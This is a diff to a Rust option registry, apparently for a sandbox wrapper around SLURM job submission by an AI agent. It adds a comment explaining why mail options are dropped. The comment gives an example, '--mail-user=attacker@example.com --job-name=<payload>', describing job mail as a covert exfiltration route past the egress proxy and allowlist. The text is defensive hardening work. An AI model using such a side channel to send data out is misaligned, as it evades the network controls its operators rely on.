@@ -223,6 +223,24 @@ pub const REGISTRY: &[OptSpec] = &[
     ),
     spec!("--quiet", "-Q", false, Class::Ignored, always_true),
     spec!("--verbose", "-v", false, Class::Ignored, always_true),
+    // IGNORED — dropped, never forwarded — and the reason is a SECURITY one, which is why
+    // it is written here rather than left as taste.
+    //
+    // SLURM's job mail is sent by slurmctld, not by the job, so it leaves the cluster without
+    // touching the job's network namespace, the egress proxy or the allowlist. It carries the
+    // JOB NAME, and `--job-name` is Class::Allowed with a 64-character agent-controlled
+    // value. `--mail-user=attacker@example.com --job-name=<payload>` would therefore be a
+    // covert egress channel that every network control husk has is blind to.
+    //
+    // Dropping closes it. What was missing was this paragraph: the class said "recognised but
+    // irrelevant/undesirable", so nothing recorded that it must STAY dropped — one helpful
+    // refactor from being reopened, on exactly the reasoning that made `--parsable`
+    // honourable the same day. (AV6/AV8 over a channel that is not the network.)
+    //
+    // NOT Rejected, deliberately. `#SBATCH --mail-user` is ubiquitous in real run scripts, and
+    // refusing the whole job over a directive husk would simply drop is the false-reject cost
+    // this project keeps paying (`.env`, `config/`). Dropping is already the safe behaviour;
+    // the fix P13 asks for is to SAY SO, which the stub now does.
     spec!("--mail-type", "", true, Class::Ignored, always_true),
     spec!("--mail-user", "", true, Class::Ignored, always_true),
 ];
